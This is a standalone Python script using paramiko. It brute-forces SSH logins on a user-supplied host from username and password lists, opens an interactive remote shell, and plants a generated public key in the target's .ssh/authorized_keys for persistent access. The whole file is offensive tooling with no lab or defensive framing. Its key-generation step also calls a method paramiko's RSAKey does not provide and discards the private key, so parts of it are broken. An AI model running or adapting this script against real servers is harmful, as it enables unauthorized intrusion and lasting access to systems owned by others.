import paramiko
import getpass

def brute_force_ssh(host, port, username_list, password_list):
    for username in username_list:
        for password in password_list:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=port, username=username, password=password)
                print(f"Successful login: {username}:{password}")
                # Add your further actions here
                ssh.close()
                return
            except paramiko.AuthenticationException:
                print(f"Failed login: {username}:{password}")
            except paramiko.SSHException as e:
                print(f"SSH error: {e}")

def generate_ssh_key_pair():
    # Generate RSA key pair
    key = paramiko.RSAKey.generate(2048)
    private_key = key.get_private_key()
    public_key = key.get_base64()
    return private_key, public_key

def add_ssh_key_to_server(public_key, host, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(host, port=port, username=username, password=password)
    sftp = ssh.open_sftp()
    try:
        sftp.mkdir(".ssh")
    except IOError:
        pass
    with sftp.file(".ssh/authorized_keys", "a") as f:
        f.write(public_key)
    sftp.close()

def interact_with_remote_shell(host, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(host, port=port, username=username, password=password)
    channel = ssh.invoke_shell()
    while True:
        command = input("Enter command to execute (exit to quit): ")
        if command.lower() == "exit":
            break
        channel.send(command + "\n")
        output = channel.recv(1024)
        print(output.decode())

if __name__ == "__main__":
    print("1.Bruteforce \n2.Interactive shell \n")
    option = int(input("Enter the Function number to perform: "))
    if option == 1:
        host = input("Enter the hostname or IP address: ")
        port = int(input("Enter the port number: "))
        username_list = ["dedlinux", "user2"]  # Add more usernames if needed
        # You may load passwords from a file or generate them dynamically
        password_list = ["1111", "password2"]  # Add more passwords if needed

        # Brute-force SSH login
        brute_force_ssh(host, port, username_list, password_list)
    
    elif option == 2:
        host = input("Enter the hostname or IP address: ")
        port = int(input("Enter the port number: "))
        username = input("Enter your username: ")
        password = getpass.getpass("Enter your password: ")
        
        interact_option = input("Do you want to use SSH key authentication? (yes/no): ").lower()
        
        if interact_option == "yes":
            private_key, public_key = generate_ssh_key_pair()
            add_ssh_key_to_server(public_key, host, port, username, password)
            print("SSH key pair generated and added to the server.")
            print("You can now use interactive shell with SSH key authentication.")
        else:
            interact_with_remote_shell(host, port, username, password)
